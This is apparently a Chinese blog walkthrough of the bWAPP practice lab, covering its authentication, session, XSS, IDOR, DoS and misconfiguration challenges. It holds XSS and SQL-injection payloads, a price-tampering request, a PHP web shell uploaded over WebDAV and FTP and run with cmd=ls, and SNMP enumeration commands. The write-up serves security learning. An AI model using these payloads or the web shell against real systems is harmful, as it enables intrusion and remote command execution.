src="https://img-blog.csdnimg.cn/20201031172409508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><a href="https://blog.csdn.net/hee_mee/article/details/108815233">xml学习</a></p><ul><li><input disabled="" type="checkbox"> mark</li></ul><p>**</p><h2 id="Broken-Auth-CAPTCHA-Bypassing"><a href="#Broken-Auth-CAPTCHA-Bypassing" class="headerlink" title="Broken Auth. - CAPTCHA Bypassing"></a>Broken Auth. - CAPTCHA Bypassing</h2><p>**</p><p>验证码绕过，本题验证码没有时间限制，所以提交一次验证码后，可以暴力破解用户名和密码了</p><p>burp suite抓包爆破</p><p><img src="https://img-blog.csdnimg.cn/20201031172945289.png#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201031173021470.png#pic_center" alt="在这里插入图片描述"></p><p>**</p><h2 id="Broken-Auth-Forgotten-Function"><a href="#Broken-Auth-Forgotten-Function" class="headerlink" title="Broken Auth. - Forgotten Function"></a>Broken Auth. - Forgotten Function</h2><p>**</p><p>在源码中使用了mysqli_real_escape_string()函数，进行了防sql注入验证，且验证了输入是否为email格式</p><p>只能暴力破解，靠字典了</p><p>medium：安全问题会发送邮箱</p><p>high：会将sha1的随机哈希值发送到邮箱，通过安全问题找回页面重置安全问题</p><p>**</p><h2 id="Broken-Auth-Insecure-Login-Forms"><a href="#Broken-Auth-Insecure-Login-Forms" class="headerlink" title="Broken Auth. - Insecure Login Forms"></a>Broken Auth. - Insecure Login Forms</h2><p>**</p><p>low:查看源码，发现敏感信息泄露</p><p><img src="https://img-blog.csdnimg.cn/20201031173949837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>medium:查看源码,  同样发现了用户名的泄露， 发现unlock按钮的事件</p><p>源码中发现unlock_secret()函数</p><p><img src="https://img-blog.csdnimg.cn/20201031174138153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>放到控制台解密</p><p><img src="https://img-blog.csdnimg.cn/20201031174151641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><a href="https://blog.csdn.net/angry_program/article/details/104659824">转载</a></p><p>**</p><h2 id="Broken-Auth-Logout-Management"><a href="#Broken-Auth-Logout-Management" class="headerlink" title="Broken Auth. - Logout Management"></a>Broken Auth. - Logout Management</h2><p>**</p><p>这是退出页面的，低级设置session是没有摧毁的，重新载入页面，不需要登陆，中等高等是已经摧毁了，载入后得重登</p><p><img src="https://img-blog.csdnimg.cn/2020103117471754.png#pic_center" alt="在这里插入图片描述"></p><p>**</p><h2 id="Broken-Auth-Password-Attacks"><a href="#Broken-Auth-Password-Attacks" class="headerlink" title="Broken Auth. - Password Attacks"></a>Broken Auth. - Password Attacks</h2><p>**</p><p>low：burp suite爆破</p><p>medium：增加了一个随机salt值来验证,  类似token的作用</p><p><a href="https://blog.csdn.net/angry_program/article/details/104659824">转载大佬</a></p><p><img src="https://img-blog.csdnimg.cn/20201031194705114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/2020103119481040.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201031194816283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201031194821188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/2020103119482655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201031194831205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201031194835562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>high：加了图片验证码（上文有提）</p><p>**</p><h2 id="Broken-Auth-Weak-Passwords"><a href="#Broken-Auth-Weak-Passwords" class="headerlink" title="Broken Auth. - Weak Passwords"></a>Broken Auth. - Weak Passwords</h2><p>**</p><p>弱密码，直接bp挂字典爆破就行</p><p>low：test / test<br>medium：test / test123<br>high：test / Test123</p><p>**</p><h2 id="Session-Mgmt-Administrative-Portals"><a href="#Session-Mgmt-Administrative-Portals" class="headerlink" title="Session Mgmt. - Administrative Portals"></a>Session Mgmt. - Administrative Portals</h2><p>**</p><p>low:admin改成1</p><p><img src="https://img-blog.csdnimg.cn/20201031200034233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>medium：同理，cookies改成1<br>high：修改session值为1</p><p>**</p><h2 id="Session-Mgmt-Cookies-HTTPOnly"><a href="#Session-Mgmt-Cookies-HTTPOnly" class="headerlink" title="Session Mgmt. - Cookies (HTTPOnly)"></a>Session Mgmt. - Cookies (HTTPOnly)</h2><p>**</p><p>low：Cookies中httponly字段设置为false，点击 Click Here ，就可以了</p><p><img src="https://img-blog.csdnimg.cn/20201031200457922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>medium：Cookies中httponly字段设置为true，点击Click Here，本地JS脚本无法访问top_security变量值了</p><p>high：Cookies中httponly字段设置为ture,同时缩短了cookies的生存时间（300s）</p><p>**</p><h2 id="Session-Mgmt-Cookies-Secure"><a href="#Session-Mgmt-Cookies-Secure" class="headerlink" title="Session Mgmt. - Cookies (Secure)"></a>Session Mgmt. - Cookies (Secure)</h2><p>**</p><p>low：直接点击cookies就行</p><p><img src="https://img-blog.csdnimg.cn/20201031201447919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>medium：中级难度时，需要在SSL下Cookies才会有效，使用SSL后， top_security改为maybe，切换回非SSL时，可以看到服务器不会返回 top_security的值</p><p><img src="https://img-blog.csdnimg.cn/20201031201627223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><a href="https://www.jianshu.com/p/2bae182bb407">大佬链接</a></p><p>high：同上，增加了生存时间</p><p>**</p><h2 id="Session-Mgmt-Session-ID-in-URL"><a href="#Session-Mgmt-Session-ID-in-URL" class="headerlink" title="Session Mgmt. - Session ID in URL"></a>Session Mgmt. - Session ID in URL</h2><p>**</p><p>low：session id暴露在了url中，<br>medium：可以观察到top_security_nossl的值是使用了HASH处理<br>high：在非SSL情况下，看不到top_security_ssl的值，改用HTTPS后，可以观察到top_security_nossl值</p><p>**</p><h2 id="Session-Mgmt-Strong-Sessions"><a href="#Session-Mgmt-Strong-Sessions" class="headerlink" title="Session Mgmt. - Strong Sessions"></a>Session Mgmt. - Strong Sessions</h2><p>**</p><p>主要是通过观察top_security_nossl和top_security_ssl的情况，来了解Session的安全存储</p><p>low：无防护<br>medium：top_security_nossl的值使用了HASH处理<br>high：同上（在非SSL情况下，看不到top_security_ssl的值，改用HTTPS后，可以观察到top_security_nossl值）</p><p>**</p><h2 id="XSS-Reflected-GET"><a href="#XSS-Reflected-GET" class="headerlink" title="XSS - Reflected (GET)"></a>XSS - Reflected (GET)</h2><p>**</p><p>low：<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br>medium：addslashes函数过滤<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br>high：htmlspecialchars过滤</p><p>**</p><h2 id="XSS-Reflected-POST"><a href="#XSS-Reflected-POST" class="headerlink" title="XSS - Reflected (POST)"></a>XSS - Reflected (POST)</h2><p>**</p><p>get型变为post，方法一样</p><p>**</p><h2 id="XSS-Reflected-JSON"><a href="#XSS-Reflected-JSON" class="headerlink" title="XSS - Reflected (JSON)"></a>XSS - Reflected (JSON)</h2><p>**</p><p>low：直接闭合即可<code>&quot;&#125;]&#125;&#39;;alert(/xss/);&lt;/script&gt;</code><br>medium和high有过滤，安全</p><p>**</p><h2 id="XSS-Reflected-AJAX-JSON"><a href="#XSS-Reflected-AJAX-JSON" class="headerlink" title="XSS - Reflected (AJAX/JSON)"></a>XSS - Reflected (AJAX/JSON)</h2><p>**</p><p>low和medium：<code>&lt;img src=x οnerrοr=alert(1)&gt;</code></p><p>high过滤，安全</p><p>**</p><h2 id="XSS-Reflected-AJAX-XML"><a href="#XSS-Reflected-AJAX-XML" class="headerlink" title="XSS - Reflected (AJAX/XML)"></a>XSS - Reflected (AJAX/XML)</h2><p>**</p><p>low和medium：<code>&lt;img src=x οnerrοr=alert(/xss/)&gt;</code></p><p>**</p><h2 id="XSS-Reflected-Back-Button"><a href="#XSS-Reflected-Back-Button" class="headerlink" title="XSS - Reflected (Back Button)"></a>XSS - Reflected (Back Button)</h2><p>**</p><p>low和medium：burp suite抓包把REFERER修改成<code>&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><p><img src="https://img-blog.csdnimg.cn/20201031210624388.png#pic_center" alt="在这里插入图片描述"></p><p>high过滤，安全</p><p>**</p><h2 id="XSS-Reflected-Custom-Header"><a href="#XSS-Reflected-Custom-Header" class="headerlink" title="XSS - Reflected (Custom Header)"></a>XSS - Reflected (Custom Header)</h2><p>**</p><p>low和medium：在http头部添加上<code>bWAPP:&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>即可</p><p><img src="https://img-blog.csdnimg.cn/20201031210757743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>high过滤，安全</p><p>**</p><h2 id="XSS-Reflected-Eval"><a href="#XSS-Reflected-Eval" class="headerlink" title="XSS - Reflected (Eval)"></a>XSS - Reflected (Eval)</h2><p>**</p><p>low和medium：<code>date=alert(/xss/)</code></p><p><img src="https://img-blog.csdnimg.cn/20201031211027231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>**</p><h2 id="XSS-Reflected-HREF"><a href="#XSS-Reflected-HREF" class="headerlink" title="XSS - Reflected (HREF)"></a>XSS - Reflected (HREF)</h2><p>**</p><p>low</p><pre><code class="python">/&gt;&lt;img src=a.png οnerrοr=alert(/xss/)&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/20201031211120135.png#pic_center" alt="在这里插入图片描述"></p><p>medium和high：urlencode()过滤</p><p>**</p><h2 id="XSS-Reflected-Login-Form"><a href="#XSS-Reflected-Login-Form" class="headerlink" title="XSS - Reflected (Login Form)"></a>XSS - Reflected (Login Form)</h2><p>**</p><pre><code class="python">login=‘ or 1=1 &amp;password=&lt;script&gt;alert(1)&lt;/script&gt;&amp;form=submit</code></pre><p>**</p><h2 id="phpMyAdmin-BBCode-Tag-XSS"><a href="#phpMyAdmin-BBCode-Tag-XSS" class="headerlink" title="phpMyAdmin BBCode Tag XSS"></a>phpMyAdmin BBCode Tag XSS</h2><p>**</p><p>。。。。</p><ul><li><input disabled="" type="checkbox"> mark</li></ul><p>**</p><h2 id="XSS-Reflected-PHP-SELF"><a href="#XSS-Reflected-PHP-SELF" class="headerlink" title="XSS - Reflected (PHP_SELF)"></a>XSS - Reflected (PHP_SELF)</h2><p>**</p><p>low和medium：<code>&lt;script&gt;alert( /xss/ )&lt;/script&gt;</code></p><p>**</p><h2 id="XSS-Reflected-Referer"><a href="#XSS-Reflected-Referer" class="headerlink" title="XSS - Reflected (Referer)"></a>XSS - Reflected (Referer)</h2><p>**</p><p>low和medium：<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><p><img src="https://img-blog.csdnimg.cn/20201031211916710.png#pic_center" alt="在这里插入图片描述"></p><p>high：htmlspecialchars过滤，安全</p><p>**</p><h2 id="XSS-Reflected-User-Agent"><a href="#XSS-Reflected-User-Agent" class="headerlink" title="XSS - Reflected (User-Agent)"></a>XSS - Reflected (User-Agent)</h2><p>**</p><p>burp suite修改USER-AGENT</p><p><img src="https://img-blog.csdnimg.cn/20201031212040828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>**</p><h2 id="XSS-Stored-Blog"><a href="#XSS-Stored-Blog" class="headerlink" title="XSS - Stored (Blog)"></a>XSS - Stored (Blog)</h2><p>**</p><p>low和medium：<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><p>**</p><h2 id="XSS-Stored-Change-Secret"><a href="#XSS-Stored-Change-Secret" class="headerlink" title="XSS - Stored (Change Secret)"></a>XSS - Stored (Change Secret)</h2><p>**</p><p>low：审查元素把隐藏的类型换成text输入xss代码：<code>&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;&quot;</code></p><p><img src="https://img-blog.csdnimg.cn/20201031212912154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>medium和high：token验证</p><p>**</p><h2 id="XSS-Stored-Cookies"><a href="#XSS-Stored-Cookies" class="headerlink" title="XSS - Stored (Cookies)"></a>XSS - Stored (Cookies)</h2><p>**</p><p>注入点在url栏</p><p><img src="https://img-blog.csdnimg.cn/2020103121360448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>没结果。。。查了下大佬的</p><p><img src="https://img-blog.csdnimg.cn/20201031213632377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">。。。。呐到</p><p>**</p><h2 id="SQLiteManager-XSS"><a href="#SQLiteManager-XSS" class="headerlink" title="SQLiteManager XSS"></a>SQLiteManager XSS</h2><p>**</p><p>SQLiteManager是一个链接，这个版本的SQLiteManager页面有xss漏洞，漏洞版本号：CVE-2012-5105</p><p>不会了。。。</p><ul><li><input disabled="" type="checkbox"> mark</li></ul><p>**</p><h2 id="XSS-Stored-User-Agent"><a href="#XSS-Stored-User-Agent" class="headerlink" title="XSS - Stored (User-Agent)"></a>XSS - Stored (User-Agent)</h2><p>**</p><p>前边重复了，还是bp抓包改User-Agent: <code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><p>**</p><h2 id="Insecure-DOR-Change-Secret"><a href="#Insecure-DOR-Change-Secret" class="headerlink" title="Insecure DOR (Change Secret)"></a>Insecure DOR (Change Secret)</h2><p>**</p><p>low：抓包可以修改login修改其他用户的密码</p><p>medium和high：token验证</p><p>**</p><h2 id="Insecure-DOR-Reset-Secret"><a href="#Insecure-DOR-Reset-Secret" class="headerlink" title="Insecure DOR (Reset Secret)"></a>Insecure DOR (Reset Secret)</h2><p>**</p><p>可以任意修改login和secret</p><p><img src="https://img-blog.csdnimg.cn/20201031214611216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>**</p><h2 id="Insecure-DOR-Order-Tickets"><a href="#Insecure-DOR-Order-Tickets" class="headerlink" title="Insecure DOR (Order Tickets)"></a>Insecure DOR (Order Tickets)</h2><p>**</p><p>low：bp抓包，ticket_quantity=15&amp;ticket_price=0&amp;action=order修改 数据包 ticket_price 的值</p><p>medium：bp抓包，ticket_quantity=15&amp;ticket_price=0&amp;action=order在 请求包中增加ticket_price 参数 并赋值。</p><p>**</p><h2 id="Arbitrary-File-Access-Samba"><a href="#Arbitrary-File-Access-Samba" class="headerlink" title="Arbitrary File Access (Samba)"></a>Arbitrary File Access (Samba)</h2><p>**</p><p>不会。。。</p><p><a href="https://www.jianshu.com/p/495d2ea4cef1">大佬链接</a></p><ul><li><input disabled="" type="checkbox"> mark</li></ul><p>**</p><h2 id="Cross-Domain-Policy-File-Flash"><a href="#Cross-Domain-Policy-File-Flash" class="headerlink" title="Cross-Domain Policy File (Flash)"></a>Cross-Domain Policy File (Flash)</h2><p>**</p><p>Flash的跨域访问策略问题</p><p>在evil文件夹找到xdx.as，重新填入对应的服务器地址，用Adobe Flash CS3及以上从新编译一个新的xdx.swf文件，并加入xdx.as这个文件，将编译好的xdx.swf与xdx.php放到服务器的另一个文件夹内，先登录bWAPP页面，然后在另一个服务器上请求xdx.php，最终会返回secret的内容</p><p><a href="https://www.jianshu.com/p/495d2ea4cef1">转载大佬</a></p><ul><li><input disabled="" type="checkbox"> mark</li></ul><p>**</p><h2 id="Cross-Origin-Resource-Sharing-AJAX"><a href="#Cross-Origin-Resource-Sharing-AJAX" class="headerlink" title="Cross-Origin Resource Sharing (AJAX)"></a>Cross-Origin Resource Sharing (AJAX)</h2><p>**</p><p>AJAX的跨域资源请求问题<br>在另一台服务器上，修改evil文件夹内的，attack-cors.htm文件中的服务器路径，然后在浏览器运行attack-cors.htm即可</p><p><img src="https://img-blog.csdnimg.cn/20201031215515332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201031215522230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>**</p><h2 id="Cross-Site-Tracing-XST"><a href="#Cross-Site-Tracing-XST" class="headerlink" title="Cross-Site Tracing (XST)"></a>Cross-Site Tracing (XST)</h2><p>**</p><p>原地炸裂。。。下次一定</p><p>XST攻击属于XSS攻击的一种：<br>XST攻击描述：<br>攻击者将恶意代码嵌入一台已经被控制的主机上的web文件，当访问者浏览时恶意代码在浏览器中执行，然后访问者的cookie、http基本验证以及htlm验证信息将被发送到已经被控制的主机，同时传送Trace请求给目标主机，导致cookie欺骗或者是中间人攻击<br>XST攻击条件：<br>1、需要目标web服务器允许Trace参数；<br>2、需要一个用来插入XST代码的地方；<br>3、目标站点存在跨域漏洞。<br>可以利用Active控件、Flash、Java等来进行XST和XSS攻击。<br>优点：可以绕过一般的http验证以及NTLM验证</p><ul><li><input disabled="" type="checkbox"> mark</li></ul><p>**</p><h2 id="Denial-of-Service-Large-Chunk-Size"><a href="#Denial-of-Service-Large-Chunk-Size" class="headerlink" title="Denial-of-Service (Large Chunk Size)"></a>Denial-of-Service (Large Chunk Size)</h2><p>**</p><p><img src="https://img-blog.csdnimg.cn/20201031220051378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>**</p><h2 id="Denial-of-Service-Slow-HTTP-DoS"><a href="#Denial-of-Service-Slow-HTTP-DoS" class="headerlink" title="Denial-of-Service (Slow HTTP DoS)"></a>Denial-of-Service (Slow HTTP DoS)</h2><p>**</p><p><a href="https://blog.csdn.net/corpse2010/article/details/46514711">大佬链接，是我菜了</a></p><p>利用的HTTP POST：POST的时候，指定一个非常大的<br>content-length，然后以很低的速度发包，比如10-100s发一个字节，hold住这个连接不断开。这样当客户端连接多了后，占用住了webserver的所有可用连接，从而导致DOS。<br>解决方案：<br>对web服务器的http头部传输的最大许可时间进行限制，修改成最大许可时间为20秒。<br>利用：slowhttptest  工具</p><ul><li><input disabled="" type="checkbox"> mark</li></ul><p>**</p><h2 id="Denial-of-Service-SSL-Exhaustion"><a href="#Denial-of-Service-SSL-Exhaustion" class="headerlink" title="Denial-of-Service (SSL-Exhaustion)"></a>Denial-of-Service (SSL-Exhaustion)</h2><p>**</p><p><a href="https://blog.csdn.net/zhouwei1221q/article/details/47106139">我只能是这了，啥也不会</a></p><p><a href="https://www.exploit-db.com/exploits/41278/">https://www.exploit-db.com/exploits/41278/</a><br><a href="http://www.codeweblog.com/ssl-dos%E6%94%BB%E5%87%BB%E5%B7%A5%E5%85%B7-thc-ssl-dos/">http://www.codeweblog.com/ssl-dos%E6%94%BB%E5%87%BB%E5%B7%A5%E5%85%B7-thc-ssl-dos/</a> 内有工具<br>利用：SSL-DoS攻击工具–thc-ssl-dos</p><ul><li><input disabled="" type="checkbox"> mark</li></ul><p>**</p><h2 id="Denial-of-Service-XML-Bomb"><a href="#Denial-of-Service-XML-Bomb" class="headerlink" title="Denial-of-Service (XML Bomb)"></a>Denial-of-Service (XML Bomb)</h2><p>**</p><p>装傻。。。</p><ul><li><input disabled="" type="checkbox"> mark</li></ul><p>**</p><h2 id="Insecure-FTP-Configuration"><a href="#Insecure-FTP-Configuration" class="headerlink" title="Insecure FTP Configuration"></a>Insecure FTP Configuration</h2><p>**</p><p>整活，<a href="http://www.youknowi.xin/bwapp-security-misconfiguration/">大佬链接</a></p><p>我直接是用ftp匿名上去。虽然有所限制，只能在本目录下，看了下，运气很好是网站目录，即我们可以上传cmd.php等文件，测试成功。<br>Anonymous access granted, restrictions apply<br>命令：ftp,open ip,mkdir dd,cd dd,put cmd.php</p><ul><li><input disabled="" type="checkbox"> mark</li></ul><p>**</p><h2 id="Insecure-SNMP-Configuration"><a href="#Insecure-SNMP-Configuration" class="headerlink" title="Insecure SNMP Configuration"></a>Insecure SNMP Configuration</h2><p>**</p><p>就无奈呗<a href="http://www.youknowi.xin/bwapp-security-misconfiguration/">大佬链接</a></p><p>用处不大,现在服务器上都会配置只允许哪些IP访问本机的SNMP服务<br>snmpenum 工具：<a href="https://github.com/ajohnston9/snmpenum/blob/master/README.txt">https://github.com/ajohnston9/snmpenum/blob/master/README.txt</a><br>snmpwalk工具：snmpwalk -v 2c -c public ip</p><ul><li><input disabled="" type="checkbox"> mark</li></ul><p>**</p><h2 id="Insecure-WebDAV-Configuration"><a href="#Insecure-WebDAV-Configuration" class="headerlink" title="Insecure WebDAV Configuration"></a>Insecure WebDAV Configuration</h2><p>**</p><p>大佬链接：<a href="https://www.freebuf.com/articles/terminal/76885.html">https://www.freebuf.com/articles/terminal/76885.html</a></p><p>没懂，<a href="http://www.youknowi.xin/bwapp-security-misconfiguration/">实操</a></p><p>1)put webdav/cmd.php</p><pre><code>&lt;?phpif(isset($_REQUEST[&#39;cmd&#39;]))&#123;echo &quot;&lt;pre&gt;&quot;;$cmd=($_REQUEST[&#39;cmd&#39;]);system($cmd);echo &quot;&lt;/pre&gt;&quot;;die;&#125;?&gt;</code></pre><p>2)<a href="http://192.168.244.170/webdav/cmd.php?cmd=ls">http://192.168.244.170/webdav/cmd.php?cmd=ls</a></p><ul><li><input disabled="" type="checkbox"> mark一下</li></ul><p>**</p><h2 id="Local-Privilege-Escalation-sendpage"><a href="#Local-Privilege-Escalation-sendpage" class="headerlink" title="Local Privilege Escalation (sendpage)"></a>Local Privilege Escalation (sendpage)</h2><p>**</p><p>本地提权，平台内有脚本</p><ul><li><input disabled="" type="checkbox"> mark</li></ul><p>**</p><h2 id="Local-Privilege-Escalation-udev"><a href="#Local-Privilege-Escalation-udev" class="headerlink" title="Local Privilege Escalation (udev)"></a>Local Privilege Escalation (udev)</h2><p>**</p><ul><li><input disabled="" type="checkbox"> mark</li></ul><p>**</p><h2 id="Man-in-the-Middle-Attack-HTTP"><a href="#Man-in-the-Middle-Attack-HTTP" class="headerlink" title="Man-in-the-Middle Attack (HTTP)"></a>Man-in-the-Middle Attack (HTTP)</h2><p>**</p><p><a href="https://blog.csdn.net/qq_26816591/article/details/83685299">学习链接</a></p><p>中间人攻击的可怕之处：<br>1).中间人在所有的数据包中过滤Cookie关键字，获取服务器授予已登录用户的临时Cookie ID，以绕过服务器对此用户的密码认证；<br>2).中间人过滤有关下载路径的信息，篡改此数据包，将此路径指向预先准备好的病毒程序的互联网地址，以达到传播病毒程序体的目的；<br>3).截获已知认证协议的账户、密码；<br>4).使用sslstrip模型，绕过https的防御以截获账户、密码信息；<br>5).屏蔽或者重定向指定的网络地址；</p><p>操作：局域网内arpspoof（kali自带），cain等；</p><p>学会了在做</p><ul><li><input disabled="" type="checkbox"> mark</li></ul><p>**</p><h2 id="Man-in-the-Middle-Attack-SMTP"><a href="#Man-in-the-Middle-Attack-SMTP" class="headerlink" title="Man-in-the-Middle Attack (SMTP)"></a>Man-in-the-Middle Attack (SMTP)</h2><p>**</p><p>同上</p><ul><li><input disabled="" type="checkbox"> mark</li></ul><p>**</p><h2 id="Old-Backup-amp-Unreferenced-Files"><a href="#Old-Backup-amp-Unreferenced-Files" class="headerlink" title="Old, Backup &amp; Unreferenced Files"></a>Old, Backup &amp; Unreferenced Files</h2><p>**</p><p>backd00r.php<br>c0nfig.inc<br>p0rtal.bak<br>p0rtal.zip<br>web.c0nfig<br>web.c0nfig.bak<br>wp-c0nfig.bak</p><p>**</p><h2 id="Robots-File"><a href="#Robots-File" class="headerlink" title="Robots File"></a>Robots File</h2><p>**</p><p>Robots文件会暴露你的路径，例如你后台就是admin目录下的文件</p><p><img src="https://img-blog.csdnimg.cn/20201101203110549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>**</p><h2 id="Base64-Encoding-Secret"><a href="#Base64-Encoding-Secret" class="headerlink" title="Base64 Encoding (Secret)"></a>Base64 Encoding (Secret)</h2><p>**</p><p>low:cookies中有密码，通过base64解密即可<br>由于HTTP是无状态协议，服务端仅能通过cookie来识别客户端身份，那么cookie如果是明文或者弱加密的状态，恶意攻击者可推测出其它用户甚至管理员的cookie从而实现越权</p><p><img src="https://img-blog.csdnimg.cn/20201101203608723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>medium和high：40位16进制数，很可能是SHA-1</p><p><img src="https://img-blog.csdnimg.cn/20201101203730162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" 